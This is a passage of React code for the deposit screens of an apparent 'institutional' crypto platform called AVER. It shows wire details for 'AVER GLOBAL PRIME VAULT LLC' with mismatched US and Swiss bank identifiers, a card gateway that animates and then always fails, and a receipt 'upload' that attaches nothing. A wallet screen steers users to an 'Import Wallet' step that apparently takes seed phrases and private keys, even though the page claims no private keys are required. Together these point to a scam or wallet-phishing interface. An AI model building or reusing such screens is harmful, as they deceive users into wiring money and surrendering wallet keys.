                              { label: 'Beneficiary Name', value: 'AVER GLOBAL PRIME VAULT LLC' },
                              { label: 'SWIFT / BIC Code', value: 'CHASUS33XXX' },
                              { label: 'Routing (ABA)', value: '021000021' },
                              { label: 'Account / IBAN', value: 'CH93 0000 0000 4982 9182 3' },
                              { label: 'Required Reference / Memo', value: bankRef, highlight: true },
                            ].map((f) => (
                              <div 
                                key={f.label} 
                                className={`flex items-center justify-between rounded-xl bg-neutral-900/90 p-3.5 ring-1 border-t border-white/15 ${
                                  f.highlight 
                                    ? 'ring-purple-500/50 bg-purple-950/30 shadow-lg shadow-purple-900/20' 
                                    : 'ring-white/10'
                                }`}
                              >
                                <div>
                                  <div className="text-[10px] text-neutral-400 font-medium">{f.label}</div>
                                  <div className={`text-xs font-mono font-bold mt-0.5 ${f.highlight ? 'text-purple-300 text-sm' : 'text-white'}`}>{f.value}</div>
                                </div>
                                <button 
                                  onClick={() => handleCopy(f.value)}
                                  className="rounded-lg bg-white/5 px-2.5 py-1 text-xs font-semibold text-neutral-300 ring-1 ring-white/10 hover:bg-white/10 active:scale-95 transition"
                                >
                                  Copy
                                </button>
                              </div>
                            ))}
                          </div>
                        </div>

                        {/* Wire Proof Upload */}
                        <div className="space-y-2">
                          <label className="text-xs font-medium text-neutral-300">Upload Wire Transfer Receipt (Optional)</label>
                          <div 
                            onClick={() => {
                              setProofUploaded(true);
                              setProofFileName(`Wire_Receipt_${Math.floor(1000 + Math.random() * 9000)}.pdf`);
                            }}
                            className={`border border-dashed rounded-xl p-4 text-center cursor-pointer transition-all ${
                              proofUploaded ? 'border-purple-500 bg-purple-950/20' : 'border-white/15 bg-neutral-900/60 hover:bg-neutral-900'
                            }`}
                          >
                            <Upload className="w-5 h-5 mx-auto mb-1 text-purple-400" />
                            <p className="text-xs font-bold text-white">{proofUploaded ? `Attached: ${proofFileName}` : 'Click to attach wire confirmation receipt (PDF/PNG)'}</p>
                          </div>
                        </div>

                        <div className="p-3.5 rounded-xl bg-neutral-900/80 ring-1 ring-white/5 text-[11px] text-neutral-400 leading-relaxed flex items-center gap-2">
                          <Clock className="w-4 h-4 text-purple-400 flex-shrink-0" />
                          <span>Wire deposits take 1-3 business days. You must include the reference code in your wire instructions for automatic credit.</span>
                        </div>
                      </div>

                      {/* Bottom CTAs */}
                      <div className="pt-4 border-t border-white/10">
                        <button 
                          onClick={handleStartProcessing}
                          className="w-full rounded-xl bg-purple-600 py-4 text-sm font-bold text-white shadow-lg shadow-purple-600/30 hover:bg-purple-500 active:scale-[0.98] transition flex items-center justify-center gap-2"
                        >
                          <span>I Have Initiated This Wire (${amount.toLocaleString()})</span>
                          <ChevronRight className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                  )}

                </motion.div>
              )}

              {/* STEP 3: PROCESSING EXPERIENCE (Minimalist Black & White) */}
              {step === 'processing' && (
                <div className="fixed inset-0 z-50 bg-black text-white flex flex-col justify-between p-6 sm:p-12 overflow-hidden select-none">
                  {/* Top Bar: Small X button */}
                  <div className="flex items-center justify-between">
                    <button
                      type="button"
                      onClick={() => setStep('methods')}
                      className="w-10 h-10 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white hover:bg-white/10 transition cursor-pointer"
                      title="Cancel"
                    >
                      <X className="w-5 h-5 text-white" />
                    </button>
                    <span className="text-xs font-mono uppercase tracking-widest text-neutral-500">
                      Session Initialization
                    </span>
                    <div className="w-10" />
                  </div>

                  {/* Center Content */}
                  <div className="flex flex-col items-center justify-center space-y-6 max-w-md mx-auto text-center my-auto">
                    {/* Refined monochrome animated indicator (3 subtle dots) */}
                    <div className="flex items-center gap-2 mb-2">
                      <motion.div
                        animate={{ scale: [1, 1.4, 1], opacity: [0.3, 1, 0.3] }}
                        transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut", delay: 0 }}
                        className="w-2 h-2 rounded-full bg-white"
                      />
                      <motion.div
                        animate={{ scale: [1, 1.4, 1], opacity: [0.3, 1, 0.3] }}
                        transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut", delay: 0.2 }}
                        className="w-2 h-2 rounded-full bg-white"
                      />
                      <motion.div
                        animate={{ scale: [1, 1.4, 1], opacity: [0.3, 1, 0.3] }}
                        transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut", delay: 0.4 }}
                        className="w-2 h-2 rounded-full bg-white"
                      />
                    </div>

                    <div className="space-y-2">
                      <h2 className="text-xl sm:text-2xl font-medium tracking-tight text-white">
                        Preparing Deposit Verification
                      </h2>
                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed">
                        Please wait while we register your deposit request and prepare a verification session.
                      </p>
                    </div>

                    {/* Live Status Message with Smooth Fade */}
                    <div className="h-8 flex items-center justify-center">
                      <AnimatePresence mode="wait">
                        <motion.p
                          key={processingStepIndex}
                          initial={{ opacity: 0, y: 4 }}
                          animate={{ opacity: 1, y: 0 }}
                          exit={{ opacity: 0, y: -4 }}
                          transition={{ duration: 0.3 }}
                          className="text-xs font-mono text-neutral-300 tracking-wide"
                        >
                          {processingStepsList[processingStepIndex]}
                        </motion.p>
                      </AnimatePresence>
                    </div>
                  </div>

                  {/* Bottom Footer Note */}
                  <div className="text-center pb-2">
                    <span className="text-[11px] font-mono text-neutral-600">AVER Institutional Clearing</span>
                  </div>
                </div>
              )}

              {/* STEP 3.5: CARD GATEWAY INITIALIZING & STAGES */}
              {step === 'card_gateway_processing' && (
                <motion.div 
                  key="card_gateway_processing"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-8"
                >
                  {/* Subtle moving light effects */}
                  <div className="pointer-events-none absolute inset-0 opacity-20">
                    <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-96 h-96 rounded-full bg-emerald-500/20 blur-[120px] animate-pulse" />
                    <div className="absolute bottom-10 left-10 w-64 h-64 rounded-full bg-blue-500/10 blur-[100px]" />
                  </div>

                  {/* Header / Top */}
                  <div className="text-center space-y-3 relative z-10 max-w-xl mx-auto">
                    <div className="w-16 h-16 mx-auto rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 relative shadow-inner">
                      {cardStageFailed ? (
                        <WifiOff className="w-8 h-8 text-rose-500 animate-bounce" />
                      ) : (
                        <ShieldCheck className="w-8 h-8 text-emerald-400 animate-pulse" />
                      )}
                      <div className={`absolute inset-0 rounded-2xl blur-lg ${cardStageFailed ? 'bg-rose-500/20' : 'bg-emerald-500/20'}`} />
                    </div>

                    <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
                      Preparing Secure Payment
                    </h2>
                    <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed">
                      Please wait while we establish a secure connection to begin your card transaction.
                    </p>
                  </div>

                  {/* Large Circular Animated Progress Indicator */}
                  <div className="relative z-10 flex flex-col items-center justify-center py-4">
                    <div className="relative w-44 h-44 flex items-center justify-center">
                      {/* Outer spinning ring */}
                      <svg className="w-full h-full transform -rotate-90">
                        <circle
                          cx="88"
                          cy="88"
                          r="76"
                          stroke="currentColor"
                          strokeWidth="8"
                          className="text-neutral-900"
                          fill="transparent"
                        />
                        <motion.circle
                          cx="88"
                          cy="88"
                          r="76"
                          stroke="currentColor"
                          strokeWidth="8"
                          className={cardStageFailed ? "text-rose-500" : "text-emerald-400"}
                          fill="transparent"
                          strokeDasharray="477"
                          initial={{ strokeDashoffset: 477 }}
                          animate={{ strokeDashoffset: 477 - (477 * (cardStage / 5)) }}
                          transition={{ duration: 0.8, ease: "easeInOut" }}
                          strokeLinecap="round"
                        />
                      </svg>

                      {/* Inner Stage Icon Display & Stage Animations */}
                      <div className="absolute inset-0 flex flex-col items-center justify-center p-4 text-center space-y-1">
                        {cardStage === 1 && (
                          <div className="space-y-1 flex flex-col items-center">
                            <Lock className="w-8 h-8 text-emerald-400 animate-bounce" />
                            <span className="text-[10px] font-bold tracking-widest text-emerald-400 uppercase">Securing</span>
                          </div>
                        )}
                        {cardStage === 2 && (
                          <div className="space-y-1 flex flex-col items-center">
                            <Radio className="w-8 h-8 text-emerald-400 animate-pulse" />
                            <span className="text-[10px] font-bold tracking-widest text-emerald-400 uppercase">Gateway</span>
                          </div>
                        )}
                        {cardStage === 3 && (
                          <div className="space-y-1 flex flex-col items-center">
                            <KeyRound className="w-8 h-8 text-emerald-400 animate-spin" />
                            <span className="text-[10px] font-bold tracking-widest text-emerald-400 uppercase">Encrypting</span>
                          </div>
                        )}
                        {cardStage === 4 && (
                          <div className="space-y-1 flex flex-col items-center">
                            <CreditCard className="w-8 h-8 text-emerald-400 animate-pulse" />
                            <span className="text-[10px] font-bold tracking-widest text-emerald-400 uppercase">Authorizing</span>
                          </div>
                        )}
                        {cardStage === 5 && (
                          <div className="space-y-1 flex flex-col items-center">
                            {cardStageFailed ? (
                              <>
                                <XCircle className="w-8 h-8 text-rose-500 animate-ping" />
                                <span className="text-[10px] font-bold tracking-widest text-rose-500 uppercase animate-pulse">Failed</span>
                              </>
                            ) : (
                              <>
                                <Landmark className="w-8 h-8 text-amber-400 animate-pulse" />
                                <span className="text-[10px] font-bold tracking-widest text-amber-400 uppercase">Contacting Bank</span>
                              </>
                            )}
                          </div>
                        )}
                        <span className="text-xs font-mono font-bold text-neutral-300">Stage {cardStage} / 5</span>
                      </div>
                    </div>

                    {/* Active Status Badge */}
                    <div className="mt-4">
                      {cardStageFailed ? (
                        <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-rose-500/10 border border-rose-500/30 text-rose-400 text-xs font-bold animate-pulse">
                          <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping" />
                          Connection Failed
                        </div>
                      ) : (
                        <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold">
                          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                          Connecting...
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Single Active Stage Card (Removes previous stage and puts next one until 5/5 completes) */}
                  <div className="relative z-10 max-w-xl mx-auto space-y-4 pt-4 border-t border-white/10">
                    <div className="flex items-center justify-between text-xs font-mono text-neutral-400">
                      <span>Payment Infrastructure Stage</span>
                      <span className="text-white font-bold">Stage {cardStage} of 5</span>
                    </div>

                    <AnimatePresence mode="wait">
                      {(() => {
                        const stg = CARD_GATEWAY_STAGES.find(s => s.num === cardStage) || CARD_GATEWAY_STAGES[0];
                        return (
                          <motion.div
                            key={cardStage}
                            initial={{ opacity: 0, y: 15, scale: 0.98 }}
                            animate={{ opacity: 1, y: 0, scale: 1 }}
                            exit={{ opacity: 0, y: -15, scale: 0.98 }}
                            transition={{ duration: 0.3 }}
                            className={`p-6 rounded-2xl border transition-all duration-300 flex items-start gap-4 ${
                              cardStageFailed
                                ? 'bg-rose-950/20 border-rose-500/50 shadow-lg shadow-rose-950/30'
                                : cardStageStatus === 'completed'
                                  ? 'bg-neutral-900 border-emerald-500/40 shadow-lg shadow-emerald-950/20 ring-1 ring-emerald-500/30'
                                  : 'bg-neutral-900 border-amber-500/30 shadow-lg shadow-amber-950/20 ring-1 ring-amber-500/20'
                            }`}
                          >
                            <div className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 mt-0.5 font-bold text-xs ${
                              cardStageFailed
                                ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40'
                                : cardStageStatus === 'completed'
                                  ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                                  : 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
                            }`}>
                              {cardStageFailed ? (
                                <XCircle className="w-5 h-5 text-rose-400" />
                              ) : cardStageStatus === 'completed' ? (
                                <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                              ) : (
                                <div className="w-4 h-4 rounded-full border-2 border-amber-400 border-t-transparent animate-spin" />
                              )}
                            </div>

                            <div className="space-y-1.5 flex-1">
                              <div className="flex items-center justify-between">
                                <h4 className={`text-base font-bold ${cardStageFailed ? 'text-rose-400' : cardStageStatus === 'completed' ? 'text-white' : 'text-amber-200'}`}>
                                  {stg.title}
                                </h4>
                                {cardStageFailed ? (
                                  <span className="text-[10px] font-bold text-rose-400 bg-rose-500/10 px-2.5 py-1 rounded-full border border-rose-500/30 animate-pulse">Failed</span>
                                ) : cardStageStatus === 'completed' ? (
                                  <span className="text-[10px] font-bold text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">Completed</span>
                                ) : (
                                  <span className="text-[10px] font-bold text-amber-400 bg-amber-500/10 px-2.5 py-1 rounded-full border border-amber-500/30 animate-pulse">Pending...</span>
                                )}
                              </div>
                              <p className="text-xs text-neutral-300 leading-relaxed">
                                {stg.desc}
                              </p>
                            </div>
                          </motion.div>
                        );
                      })()}
                    </AnimatePresence>
                  </div>
                </motion.div>
              )}

              {/* STEP 3.6: DEDICATED FULL-SCREEN ERROR INTERFACE */}
              {step === 'card_gateway_error' && (
                <motion.div 
                  key="card_gateway_error"
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-8 sm:p-12 text-center space-y-8 overflow-hidden ring-1 ring-rose-500/30 shadow-2xl"
                >
                  <div className="w-20 h-20 mx-auto rounded-3xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400 relative">
                    <WifiOff className="w-10 h-10 text-rose-500 animate-pulse" />
                    <div className="absolute inset-0 rounded-3xl bg-rose-500/20 blur-xl animate-pulse" />
                  </div>

                  <div className="space-y-3 max-w-xl mx-auto">
                    <h2 className="text-3xl sm:text-4xl font-black tracking-tight text-white">Connection Failed</h2>
                    <p className="text-xs sm:text-sm text-neutral-300 leading-relaxed">
                      We were unable to establish a secure connection with the payment processor. This may be due to a temporary network issue, server maintenance, or because card payment services have not yet been configured. No payment has been processed and your card has not been charged.
                    </p>
                  </div>

                  {/* Transaction Status Card */}
                  <div className="p-6 rounded-2xl bg-black/60 border border-white/10 max-w-md mx-auto text-left space-y-3 shadow-inner">
                    <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                      <span className="text-neutral-400">Payment Status:</span>
                      <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-rose-500/10 text-rose-400 border border-rose-500/30">Failed</span>
                    </div>
                    <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                      <span className="text-neutral-400">Connection Status:</span>
                      <span className="font-bold text-amber-400">Unavailable</span>
                    </div>
                    <div className="flex justify-between items-center text-xs py-1 border-b border-white/5">
                      <span className="text-neutral-400">Gateway Response:</span>
                      <span className="font-bold text-neutral-200">Connection Error</span>
                    </div>
                    <div className="flex justify-between items-center text-xs py-1">
                      <span className="text-neutral-400">Card Charged:</span>
                      <span className="font-bold text-emerald-400">No</span>
                    </div>
                  </div>

                  <div className="pt-2 text-xs text-neutral-500 flex items-center justify-center gap-2">
                    <RefreshCw className="w-4 h-4 animate-spin text-neutral-400" />
                    <span>Redirecting to card availability status...</span>
                  </div>
                </motion.div>
              )}
              {step === 'success' && (
                <motion.div 
                  key="success"
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  className={`p-12 rounded-[32px] border text-center space-y-8 ${
                    isDark ? 'bg-slate-900/90 border-white/10 backdrop-blur-xl' : 'bg-white border-slate-200 shadow-2xl'
                  }`}
                >
                  <div className="w-20 h-20 mx-auto rounded-3xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400">
                    <CheckCircle2 className="w-10 h-10" />
                  </div>

                  <div className="space-y-2">
                    <h2 className="text-3xl font-black tracking-tight">Deposit Request Submitted</h2>
                    <p className="text-sm text-slate-400 max-w-md mx-auto">
                      Your institutional deposit of <strong className="text-emerald-400">${amount.toLocaleString()}</strong> has been submitted. Your balance will be credited as soon as it is approved by an administrator.
                    </p>
                  </div>

                  <div className={`p-6 rounded-2xl border max-w-md mx-auto text-left space-y-3 ${
                    isDark ? 'bg-black/40 border-white/10' : 'bg-slate-50 border-slate-200'
                  }`}>
                    <div className="flex justify-between text-xs">
                      <span className="text-slate-400">Reference ID:</span>
                      <span className="font-mono font-bold">DEP-{Math.floor(100000 + Math.random() * 900000)}</span>
                    </div>
                    <div className="flex justify-between text-xs">
                      <span className="text-slate-400">Status:</span>
                      <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-500/10 text-amber-400 border border-amber-500/20">Pending Admin Approval</span>
                    </div>
                    <div className="flex justify-between text-xs">
                      <span className="text-slate-400">Estimated Clearance:</span>
                      <span className="font-bold">Immediate upon verification</span>
                    </div>
                  </div>

                  <div className="flex justify-center gap-4 pt-4">
                    <button 
                      onClick={onBack}
                      className="px-8 py-4 rounded-2xl bg-emerald-500 text-slate-950 font-black text-sm hover:bg-emerald-400 transition-all shadow-xl shadow-emerald-500/20"
                    >
                      Return to Dashboard
                    </button>
                  </div>
                </motion.div>
              )}


              {/* STEP 3.7: CONNECTING WALLET FULL SCREEN */}
              {step === 'wallet_connecting' && (
                <motion.div 
                  key="wallet_connecting"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full max-w-lg mx-auto rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 text-center space-y-6 sm:space-y-8 overflow-hidden ring-1 ring-indigo-500/30 shadow-2xl min-h-[500px] flex flex-col items-center justify-between"
                >
                  <div className="pointer-events-none absolute inset-0 opacity-20">
                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 rounded-full bg-indigo-500/30 blur-[120px] animate-pulse" />
                  </div>

                  <div className="w-full flex flex-col items-center space-y-6 sm:space-y-8 my-auto py-4">
                    {/* Clean Animated Loading Ring - Perfectly Centralized */}
                    <div className="relative w-48 h-48 sm:w-56 sm:h-56 mx-auto flex items-center justify-center shrink-0">
                      <div className="absolute inset-0 rounded-full border-4 border-white/10 border-t-white border-r-white/50 animate-spin" />
                      <div className="absolute inset-3 sm:inset-4 rounded-full border-2 border-white/10 border-b-white/70 animate-spin [animation-direction:reverse]" />
                      <div className="relative z-10 w-36 h-36 sm:w-44 sm:h-44 flex items-center justify-center rounded-full overflow-hidden shadow-[0_0_40px_rgba(255,255,255,0.25)] ring-0 border-none bg-transparent">
                        <WalletLogo name={connectingWalletName} className="w-full h-full rounded-full object-cover" isConnecting={true} />
                      </div>
                    </div>

                    {/* Heading */}
                    <div className="space-y-2 max-w-md mx-auto relative z-10">
                      <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
                        Connecting Wallet
                      </h2>
                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed">
                        Establishing secure connection with <strong className="text-white">{connectingWalletName}</strong>. Please approve the connection request in your wallet.
                      </p>
                    </div>

                    {/* Dynamic Status Messages */}
                    <div className="flex flex-col items-center justify-center gap-2 relative z-10">
                      <div className="px-3.5 py-1.5 rounded-full bg-white text-black shadow-[0_0_15px_rgba(255,255,255,0.3)] flex items-center gap-2">
                        <div className="w-1.5 h-1.5 rounded-full bg-black animate-pulse" />
                        <span className="text-[10px] font-black uppercase tracking-widest">
                          {CONNECTING_STATUS_MESSAGES[connectingStatusIndex]}
                        </span>
                      </div>
                    </div>
                  </div>

                  {/* Fixed Bottom Connect Manually Trigger */}
                  <div className="w-full pt-6 border-t border-white/10 relative z-10 flex flex-col items-center gap-2">
                    <button
                      type="button"
                      onClick={() => {
                        setIsConnectingWallet(false);
                        setImportPhrase('');
                        setShowPhrase(false);
                        setImportKey('');
                        setShowKey(false);
                        setStep('wallet_import_choose');
                      }}
                      className="w-full sm:w-auto px-8 py-4 rounded-2xl bg-white text-black hover:bg-neutral-200 font-black text-sm uppercase tracking-tight transition-all shadow-[0_0_20px_rgba(255,255,255,0.15)] flex items-center justify-center gap-2"
                    >
                      <span>Import Wallet</span>
                      <ChevronRight className="w-5 h-5 text-black" />
                    </button>
                    <span className="text-[11px] text-neutral-500">
                      Connect your wallet using a secure blockchain connection.
                    </span>
                  </div>
                </motion.div>
              )}

              {/* STEP 3.8: CONNECTION CANCELLED FULL SCREEN */}
              {step === 'wallet_cancelled' && (
                <motion.div 
                  key="wallet_cancelled"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-8 sm:p-12 text-center space-y-6 overflow-hidden ring-1 ring-amber-500/30 shadow-2xl"
                >
                  <div className="w-20 h-20 mx-auto rounded-3xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 relative">
                    <XCircle className="w-10 h-10 text-amber-400" />
                    <div className="absolute inset-0 rounded-3xl bg-amber-500/20 blur-xl" />
                  </div>

                  <div className="space-y-2 max-w-md mx-auto">
                    <h2 className="text-2xl font-black tracking-tight text-white">Connection Cancelled</h2>
                    <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed">
                      The wallet connection request was declined or cancelled inside your wallet app. No data was saved.
                    </p>
                  </div>

                  <div className="pt-4 flex justify-center">
                    <button
                      type="button"
                      onClick={() => setStep('form')}
                      className="px-6 py-3 rounded-xl bg-white/10 text-white font-bold text-xs hover:bg-white/20 transition"
                    >
                      Return to Wallet Selection
                    </button>
                  </div>
                </motion.div>
              )}

              {/* STEP 3.9: CONNECT WALLET MANUALLY FULL SCREEN (INSTITUTIONAL ONBOARDING FLOW) */}
              {step === 'wallet_manual' && (
                <motion.div 
                  key="wallet_manual"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-6"
                >
                  <div className="pointer-events-none absolute inset-0 opacity-15">
                    <div className="absolute top-0 right-1/4 w-96 h-96 rounded-full bg-indigo-500/20 blur-[120px]" />
                  </div>

                  {/* Header */}
                  <div className="flex items-center justify-between pb-6 border-b border-white/10 relative z-10">
                    <button 
                      type="button"
                      onClick={() => {
                        setSelectedMethod('walletconnect');
                        setStep('form');
                      }}
                      className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 ring-1 ring-white/10 hover:bg-white/10 active:scale-95 transition"
                      title="Back to Wallet Selection"
                    >
                      <ArrowLeft className="h-5 w-5 text-white" />
                    </button>
                    <div className="flex items-center gap-3">
                      <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-indigo-500/15 ring-1 ring-indigo-500/30 text-indigo-400 shadow-lg shadow-indigo-950/50">
                        <Handshake className="w-6 h-6 text-indigo-300" />
                      </div>
                      <div className="text-left">
                        <h2 className="text-base sm:text-xl font-black tracking-tight text-white">Institutional Onboarding</h2>
                        <span className="text-[11px] text-neutral-400 block font-medium">Self-Custody Key Verification</span>
                      </div>
                    </div>
                    <span className="rounded-full bg-indigo-500/10 px-3 py-1 text-xs font-semibold text-indigo-400 ring-1 ring-indigo-500/30">
                      Manual Mode
                    </span>
                  </div>

                  {/* Hero Section */}
                  <div className="p-5 rounded-2xl bg-gradient-to-r from-indigo-950/60 via-slate-900 to-indigo-950/40 border border-indigo-500/20 text-left flex flex-col sm:flex-row items-start sm:items-center gap-4 relative overflow-hidden z-10">
                    <div className="w-12 h-12 rounded-2xl bg-indigo-500/15 border border-indigo-500/30 flex items-center justify-center shrink-0 shadow-lg shadow-indigo-950">
                      <Wallet className="w-6 h-6 text-indigo-400 animate-pulse" />
                    </div>
                    <div className="space-y-1">
                      <h3 className="text-sm sm:text-base font-bold text-white">Manual Wallet Connection</h3>
                      <p className="text-xs text-neutral-300 leading-relaxed">
                        Connect any compatible cryptocurrency wallet by securely providing your public wallet address. No private keys or signature prompts required.
                      </p>
                    </div>
                  </div>

                  {/* Form Body */}
                  <form onSubmit={handleManualConnectSubmit} className="space-y-6 relative z-10">
                    {/* Grid-based Network Selection */}
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <label className="text-xs font-bold tracking-wider text-neutral-300 uppercase flex items-center gap-2">
                          <span>Select Network</span>
                          <span className="text-[10px] font-normal text-neutral-400 font-mono">({BLOCKCHAIN_NETWORKS.length} supported)</span>
                        </label>
                        <span className="text-[11px] font-mono text-indigo-400 font-semibold">
                          Selected: {manualNetwork.name} ({manualNetwork.symbol})
                        </span>
                      </div>

                      {/* Network Search Bar */}
                      <div className="relative">
                        <Search className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-neutral-400" />
                        <input 
                          type="text"
                          value={networkSearch}
                          onChange={(e) => setNetworkSearch(e.target.value)}
                          placeholder="Search network (e.g. Ethereum, ERC-20, Solana, TRON)..."
                          className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-neutral-900 border border-white/10 text-xs text-white placeholder-neutral-500 outline-none focus:border-indigo-500/50 transition"
                        />
                      </div>

                      {/* Network Grid */}
                      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 max-h-56 overflow-y-auto pr-1">
                        {BLOCKCHAIN_NETWORKS.filter(net => 
                          net.name.toLowerCase().includes(networkSearch.toLowerCase()) || 
                          net.symbol.toLowerCase().includes(networkSearch.toLowerCase()) ||
                          net.description.toLowerCase().includes(networkSearch.toLowerCase())
                        ).map((net) => {
                          const isSelected = manualNetwork.id === net.id;
                          return (
                            <button
                              key={net.id}
                              type="button"
                              onClick={() => {
                                setManualNetwork(net);
                                setManualAddressError(null);
                                if (manualAddress) {
                                  const res = validateWalletAddress(manualAddress, net.type, net.name);
                                  if (!res.valid) {
                                    setManualAddressError(res.error || null);
                                  }
                                }
                              }}
                              className={`p-3.5 rounded-2xl border text-left transition-all relative flex flex-col justify-between h-24 group ${
                                isSelected 
                                  ? 'bg-gradient-to-br from-indigo-950/80 to-slate-900 border-indigo-500 ring-2 ring-indigo-500/40 shadow-xl shadow-indigo-950/60 scale-[1.01]' 
                                  : 'bg-neutral-900/80 border-white/10 hover:border-white/20 hover:bg-neutral-900'
                              }`}
                            >
                              <div className="flex items-center justify-between w-full">
                                <div className="flex items-center gap-2">
                                  <NetworkLogo id={net.id} className="w-6 h-6" />
                                  <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded-md bg-white/5 border border-white/10 text-neutral-300">
                                    {net.badge}
                                  </span>
                                </div>
                                {isSelected && (
                                  <div className="w-5 h-5 rounded-full bg-indigo-500 flex items-center justify-center text-slate-950">
                                    <Check className="w-3 h-3 stroke-[3]" />
                                  </div>
                                )}
                              </div>
                              <div>
                                <h4 className="text-xs font-bold text-white group-hover:text-indigo-300 transition-colors truncate">{net.name}</h4>
                                <p className="text-[10px] text-neutral-400 font-mono truncate">{net.description}</p>
                              </div>
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    {/* Elevated Card for Wallet Address Input */}
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <label className="text-xs font-bold tracking-wider text-neutral-300 uppercase flex items-center gap-2">
                          <span>Public Wallet Address</span>
                          <span className="text-[10px] text-indigo-400 font-normal">({manualNetwork.name} {manualNetwork.symbol})</span>
                        </label>
                        <span className="text-[10px] font-mono text-neutral-400">
                          {manualNetwork.type === 'evm' ? 'EVM Compatible' : manualNetwork.type === 'solana' ? 'SPL Base58' : manualNetwork.type === 'tron' ? 'TRC-20 Standard' : 'BTC Native/Bech32'}
                        </span>
                      </div>

                      <div className="relative">
                        <input
                          type="text"
                          value={manualAddress}
                          onChange={(e) => {
                            const val = e.target.value;
                            setManualAddress(val);
                            setManualAddressTouched(true);
                            const res = validateWalletAddress(val, manualNetwork.type, manualNetwork.name);
                            if (res.valid) {
                              setManualAddressError(null);
                            } else if (val.trim()) {
                              setManualAddressError(res.error || null);
                            }
                          }}
                          placeholder={`Enter or paste public ${manualNetwork.name} address...`}
                          className={`w-full font-mono text-xs sm:text-sm text-white bg-neutral-900 rounded-2xl p-4 pr-24 outline-none border transition-all ${
                            manualAddress && !manualAddressError
                              ? 'border-emerald-500/60 ring-2 ring-emerald-500/30 bg-emerald-950/10 text-emerald-100'
                              : manualAddressError && manualAddressTouched 
                              ? 'border-rose-500 ring-2 ring-rose-500/40 bg-rose-950/20 border-rose-500/50' 
                              : 'border-white/10 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20'
                          }`}
                        />

                        {/* Quick Action Buttons */}
                        <div className="absolute right-2.5 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                          <button
                            type="button"
                            onClick={handlePasteClipboard}
                            className="px-2.5 py-1.5 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-[11px] font-bold text-neutral-300 flex items-center gap-1"
                            title="Paste from Clipboard"
                          >
                            <Copy className="w-3 h-3 text-indigo-400" />
                            <span>Paste</span>
                          </button>
                          <button
                            type="button"
                            onClick={() => setIsQrScannerOpen(true)}
                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-indigo-400"
                            title="Scan QR Code"
                          >
                            <QrCode className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>

                      {/* Live Address Verified Badge */}
                      {manualAddress && !manualAddressError && (
                        <motion.div 
                          initial={{ opacity: 0, y: -4 }}
                          animate={{ opacity: 1, y: 0 }}
